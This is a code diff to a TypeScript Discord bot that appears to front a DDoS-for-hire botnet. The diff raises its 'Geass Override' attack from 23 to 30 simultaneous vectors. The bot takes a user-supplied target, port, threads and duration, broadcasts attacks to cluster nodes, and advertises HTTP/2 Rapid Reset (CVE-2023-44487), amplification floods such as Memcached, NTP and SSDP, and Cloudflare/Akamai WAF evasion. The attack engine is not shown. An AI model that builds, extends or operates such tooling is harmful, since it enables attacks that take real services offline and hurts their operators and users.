@@ -51,7 +51,7 @@ if (!BOT_TOKEN) {
 // ── Method definitions with layer grouping for the select menu ──────────────
 const METHOD_OPTIONS = [
   // ── Geass / Special ────────────────────────────────────────────────────
-  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 23v]",    description: "MAX POWER — 23 real vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+UDP+RUDY2+Cache+TLS+QUIC+SSL+H2Storm+Pipeline+HTTPBypass+SYN+ICMP+DNS+NTP+Mem+SSDP", emoji: "👁️" },
+  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 30v]",    description: "MAX POWER — 30 real vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+HTTPBypass+KAExhaust+H2Storm+Pipeline+H2Ping+Smuggling+TLSRenego+SSLDeath+QUIC+XMLBomb+SlowRead+RangeFlood+SYN+ICMP+DNS+NTP+Mem+SSDP+UDP+DoH", emoji: "👁️" },
   // ── L7 Application ─────────────────────────────────────────────────────
   { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",            description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",                     emoji: "🟣" },
   { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",             description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s",               emoji: "⚡" },
@@ -721,7 +721,7 @@ async function handleCluster(interaction: ChatInputCommandInteraction): Promise<
           .setTitle("👁️ CLUSTER BROADCAST — GEASS OVERRIDE FIRING...")
           .setDescription(
             `> *"By the power of Geass, I command ALL nodes — submit to my absolute authority!"*\n\n` +
-            `🌐 Broadcasting **ARES OMNIVECT** to **all cluster nodes** — 23 vectors × 10 machines`
+            `🌐 Broadcasting **ARES OMNIVECT ∞** to **all cluster nodes** — 30 vectors × 10 machines`
           )
           .addFields(
             { name: "🎯 Target",  value: `\`${target}\``,        inline: true },
@@ -748,7 +748,7 @@ async function handleCluster(interaction: ChatInputCommandInteraction): Promise<
             .setColor(COLORS.CRIMSON)
             .setTitle(`👁️ CLUSTER BROADCAST ACTIVE — ${nodesOnline} NODES FIRING`)
             .setDescription(
-              `👁️ **ARES OMNIVECT × ${nodesOnline}** — All cluster nodes running 23 simultaneous attack vectors\n\n` +
+              `👁️ **ARES OMNIVECT ∞ × ${nodesOnline}** — All cluster nodes running 30 simultaneous attack vectors\n\n` +
               `Primary attack **#${attack.id}** monitoring below. Peer nodes fire independently.`
             )
             .setImage("attachment://lelouch.gif")
@@ -758,7 +758,7 @@ async function handleCluster(interaction: ChatInputCommandInteraction): Promise<
               { name: "⏱ Duration",        value: `**${duration}s**`,        inline: true },
               { name: "🧵 Threads/Node",   value: `**${threads}**`,          inline: true },
               { name: "🌐 Nodes Online",   value: `**${nodesOnline}**`,      inline: true },
-              { name: "⚡ Total Vectors",  value: `**${nodesOnline * 23}** simultaneous`, inline: true },
+              { name: "⚡ Total Vectors",  value: `**${nodesOnline * 30}** simultaneous`, inline: true },
               { name: "📊 Status",         value: "🔴 **ALL NODES INITIALIZING...**", inline: true },
             )
             .setFooter({ text: AUTHOR })
@@ -794,16 +794,18 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
         .setTitle("👁️ LELOUCH vi BRITANNIA COMMANDS YOU...")
         .setDescription(
           `> *"I, Lelouch vi Britannia, hereby command all opposition... TO SUBMIT!"*\n\n` +
-          `👁️ **GEASS OVERRIDE ∞ — ARES OMNIVECT** — **23** simultaneous real attack vectors against \`${target}\`\n\n` +
-          `**L7 (11):** ConnFlood → Slowloris → H2RST(CVE-2023) → H2CONT(CVE-2024) → HPACK Bomb → WAF Bypass → WebSocket → GraphQL → RUDY v2 → Cache Poison → H2 Storm\n` +
-          `**Pipeline+TLS+UDP (7):** HTTP Pipeline(300K/s) → TLS Renego → QUIC/H3 → SSL Death → UDP Flood → HTTP Bypass → SYN Flood\n` +
-          `**L3 (5):** ICMP Flood → DNS Water Torture → NTP Flood → Memcached → SSDP M-SEARCH`
+          `👁️ **GEASS OVERRIDE ∞ — ARES OMNIVECT ∞** — **30** simultaneous real attack vectors against \`${target}\`\n\n` +
+          `**L7 App (12):** ConnFlood → Slowloris → H2RST(CVE-2023) → H2CONT(CVE-2024) → HPACK Bomb → WAF Bypass → WebSocket → GraphQL → RUDY v2 → Cache Poison → HTTP Bypass → Keepalive Exhaust\n` +
+          `**L7 H2 (4):** H2 Storm → HTTP Pipeline(300K/s) → H2 PING Storm → HTTP Smuggling\n` +
+          `**TLS (3):** TLS Renego → SSL Death → QUIC/H3\n` +
+          `**Extended App (3):** XML Bomb → Slow Read → Range Flood\n` +
+          `**L4 (1):** SYN Flood · **L3 (5):** ICMP → DNS → NTP → Memcached → SSDP · **UDP (2):** UDP Flood → DoH Flood`
         )
         .addFields(
           { name: "🎯 Target",   value: `\`${target}\``,        inline: true },
           { name: "⏱ Duration",  value: `**${duration}s**`,      inline: true },
           { name: "🧵 Threads",  value: `**${threads}** (base)`, inline: true },
-          { name: "📊 Status",   value: "🔴 **INITIALIZING 23 VECTORS — ARES OMNIVECT COMMAND...**", inline: false },
+          { name: "📊 Status",   value: "🔴 **INITIALIZING 30 VECTORS — ARES OMNIVECT ∞ COMMAND...**", inline: false },
         )
         .setFooter({ text: AUTHOR })
         .setTimestamp()
@@ -812,7 +814,7 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
 
   try {
     const attack  = await api.startAttack({ target, method: "geass-override", threads, duration, port });
-    console.log(`[GEASS #${attack.id}] 21 Vectors online — ARES OMNIVECT → ${target}`);
+    console.log(`[GEASS #${attack.id}] 30 Vectors online — ARES OMNIVECT ∞ → ${target}`);
     const row     = buildAttackButtons(attack.id, true);
     await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row], files: buildAttackFiles() });
     const userId  = interaction.user.id;
